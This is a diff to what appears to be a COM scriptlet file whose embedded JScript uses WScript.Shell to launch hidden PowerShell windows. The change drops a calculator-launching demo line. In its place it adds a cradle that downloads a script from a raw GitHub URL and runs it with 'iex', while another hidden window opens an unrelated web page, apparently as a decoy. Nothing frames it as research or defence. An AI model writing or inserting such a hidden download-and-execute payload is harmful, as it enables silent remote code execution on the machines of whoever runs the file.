@@ -8,8 +8,8 @@ classid="{AAAA0111-0000-0000-0000-0000FEEDACDC}"
  >
  <script language="JScript">
       <![CDATA[
-	   var a = new ActiveXObject("WScript.Shell").Run("powershell.exe -NoP -sta -NonI -W Hidden -c (start-process -filepath https://www.baidu.com); iex",0);
-      	   var r = new ActiveXObject("WScript.Shell").Run("c:\\windows\\system32\\calc.exe",1);
+	   var a = new ActiveXObject("WScript.Shell").Run("powershell.exe -NoP -sta -NonI -W Hidden -c (start-process -filepath http://www.ibreviary.com/m/breviario.php?s=compieta); iex",0);
+      	   var r = new ActiveXObject("WScript.Shell").Run("%windir%\\sysWOW64\\WindowsPowerShell\\v1.0\\PowerShell.exe -NoP -W Hidden -c \"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Whatisitwhy/say/master/gitup.data');\"",0);
 	   
       ]]>
  </script>
